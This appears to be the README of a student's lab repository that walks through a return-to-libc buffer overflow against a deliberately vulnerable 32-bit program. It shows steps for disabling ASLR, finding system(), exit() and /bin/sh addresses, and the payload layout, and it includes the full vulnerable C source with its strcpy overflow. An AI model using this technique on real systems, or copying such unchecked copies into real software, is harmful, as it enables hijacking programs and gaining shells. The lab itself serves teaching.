# ðŸ”“ Lab2-Libc-Attack: A Return-to-Libc Exploit

This lab demonstrates a **Return-to-libc** exploitation technique on a **32-bit Linux** system. The objective is to exploit a vulnerable program (`retlib`) that has a non-executable stack by reusing existing libc functions (`system()` and `exit()`) to execute `/bin/sh`, without injecting shellcode.

---

## Overview

This project implements a classic stack-based buffer overflow to demonstrate a **Return-to-libc (ret2libc)** attack on a 32-bit Linux binary with a non-executable stack (NX bit).

**Key Objectives:**

* Demonstrate a buffer overflow vulnerability.
* Bypass stack execution protections (NX) by reusing existing code from `libc`.
* Successfully spawn a `/bin/sh` shell by overwriting the return address to call `system()`.
* Illustrate stack frame layout and function call conventions in 32-bit x86.

## Prerequisites

* 32-bit Linux VM (lab environment)
* `gcc` with multilib support (if building 32-bit on a 64-bit host)
* Python 3
* GDB (with **peda** or similar is helpful)
* Example seed image references: [https://seedsecuritylabs.org/lab\_env.html](https://seedsecuritylabs.org/lab_env.html)

---

## Repository Files

| File | Description |
| :--- | :--- |
| `retlib.c` | The vulnerable program with a stack-based buffer overflow. |
| `envaddr.c` | A helper utility to print the address of an environment variable. |
| `exploit.py` | Python script to generate the `badfile` payload. |
| `badfile` | The binary payload file generated by `exploit.py`. |
| `README.md` | This documentation. |
| `images/` | Screenshots of the exploitation process. |

---

## Exploitation Flow

The attack bypasses the non-executable stack by overwriting the saved return address on the stack to point to the `system()` function in `libc`.

1.  **Disable ASLR**
    * Address Space Layout Randomization is disabled (`echo 0 > /proc/sys/kernel/randomize_va_space`) so that `libc` function addresses are stable across runs.

2.  **Find Target Addresses**
    * The `MYSHELL` environment variable is set: `export MYSHELL=/bin/sh`.
    * The `envaddr` helper (or GDB) is used to find the runtime address of the `"/bin/sh"` string in the target process's memory.
    * GDB is used on the `retlib` binary to find the runtime addresses for `system()` and `exit()` within the loaded `libc`.

3.  **Construct Payload**
    * The `exploit.py` script builds a `badfile` with a specific payload structure designed to overflow the `buffer` in `bof()` and overwrite the stack frame.
    * **Payload Layout:**
        ```
        [ A * (Offset to EBP) ] + [ Saved EBP ] + [ system_addr ] + [ exit_addr ] + [ sh_addr ]
        ```
    * The payload fills the buffer, restores the saved EBP (to prevent stack corruption), and hijacks the return address.

4.  **Execute Exploit**
    * The vulnerable `retlib` program reads `badfile` into its stack buffer, triggering the overflow.
    * When `bof()` returns, control flow is redirected to `system()`.
    * `system()` executes using the argument on the stack (`sh_addr`), spawning a shell.
    * When the shell exits, control flows to `exit()`, ensuring a clean program termination.

---

## How to Compile and Run

### 1. Disable ASLR (as root)

```bash
# Disable ASLR for predictable addresses
echo 0 > /proc/sys/kernel/randomize_va_space
2. Compile (32-bit)
Bash

# Compile the vulnerable program with no stack protector and a non-executable stack
gcc -m32 -o retlib retlib.c -fno-stack-protector -z noexecstack

# Compile the helper
gcc -m32 -o envaddr envaddr.c
3. Get Addresses
Bash

# Set environment variable
export MYSHELL=/bin/sh

# Get address of the string
./envaddr
# Address: bfffff01 (example)

# Get libc function addresses in GDB
gdb -q ./retlib
(gdb) p (void*) system
# $1 = (void *) 0xb7da4da0 <__libc_system> (example)
(gdb) p (void*) exit
# $2 = (void *) 0xb7d989d0 <__GI_exit> (example)
4. Build and Run Exploit
Update exploit.py with the addresses found in Step 3.

Bash

# Generate the payload
python3 exploit.py

# Run the exploit
./retlib
# ... program output ...
whoami
# seed
Step-by-Step Demonstration
1. Getting Target Addresses
Using envaddr to find the /bin/sh string and GDB to find system() and exit().

2. Payload Generation
The exploit.py script generates badfile. The hexdump shows the addresses for system, exit, and /bin/sh in little-endian format.

3. Successful Exploit
Running ./retlib consumes the badfile, overflows the buffer, and successfully spawns an interactive shell, confirmed with whoami.

Vulnerable Code (retlib.c)
C

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str) {
    char buffer[270];
    unsigned int *framep;

    // Copy ebp into framep
    asm("movl %%ebp, %0" : "=r" (framep));

    /* print out information for experiment purpose */
    printf("Address of buffer[] inside bof(): 0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof(): 0x%.8x\n", (unsigned)framep);

    strcpy(buffer, str); // <-- VULNERABILITY
    return 1;
}

int main(int argc, char **argv) {
    char input[1000];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    int length = fread(input, sizeof(char), 1000, badfile);

    printf("Address of input[] inside main(): 0x%x\n", (unsigned int) input);
    printf("Input size: %d\n", length);

    bof(input);

    printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
    return 1;
}
Summary of Results
Task: Use Return-to-libc technique to execute /bin/sh in a vulnerable 32-bit program with a non-executable stack.

Result: Successful â€” system("/bin/sh") was called and an interactive shell was obtained (whoami returned seed).

Key lessons:

Use the process-specific /bin/sh address, as environment layout differs between processes.

Restore the saved EBP if overwriting it to prevent stack corruption by the leave instruction.

Keep ASLR disabled for predictable addresses in a controlled lab environment.

Author
Prepared by: Abdulrahman ALQunaibit Lab date: October 2, 2025